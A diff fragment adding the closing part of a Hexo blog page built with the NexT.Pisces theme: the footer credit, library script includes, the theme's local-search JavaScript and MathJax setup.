+  <span class="author" itemprop="copyrightHolder">Ethan</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Pisces
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+  
+  
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+      search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.popup').toggle();
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+      $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = $( "entry", xmlResponse ).map(function() {
+            return {
+              title: $( "title", this ).text(),
+              content: $("content",this).text(),
+              url: $( "url" , this).text()
+            };
+          }).get();
+          var $input = document.getElementById(search_id);
+          var $resultContent = document.getElementById(content_id);
+          $input.addEventListener('input', function(){
+            var matchcounts = 0;
+            var str='<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length > 1) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var content_index = [];
+                var data_title = data.title.trim().toLowerCase();
+                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                var data_url = decodeURIComponent(data.url);
+                var index_title = -1;
+                var index_content = -1;
+                var first_occur = -1;
+                // only match artiles with not empty titles and contents
+                if(data_title != '') {
+                  keywords.forEach(function(keyword, i) {
+                    index_title = data_title.indexOf(keyword);
+                    index_content = data_content.indexOf(keyword);
+                    if( index_title >= 0 || index_content >= 0 ){
+                      isMatch = true;
+                      if (i == 0) {
+                        first_occur = index_content;
+                      }
+                    }
+
+                  });
+                }
+                // show search results
+                if (isMatch) {
+                  matchcounts += 1;
+                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                  var content = data.content.trim().replace(/<[^>]+>/g,"");
+                  if (first_occur >= 0) {
+                    // cut out 100 characters
+                    var start = first_occur - 20;
+                    var end = first_occur + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if(start == 0){
+                      end = 50;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    var match_content = content.substring(start, end);
+                    // highlight all keywords
+                    keywords.forEach(function(keyword){
+                      var regS = new RegExp(keyword, "gi");
+                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                    });
+
+                    str += "<p class=\"search-result\">" + match_content +"...</p>"
+                  }
+                  str += "</li>";
+                }
+              })};
+            str += "</ul>";
+            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+            $resultContent.innerHTML = str;
+          });
+          proceedsearch();
+        }
+      });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+  
+
+
+  
+
+</body>
+</html>
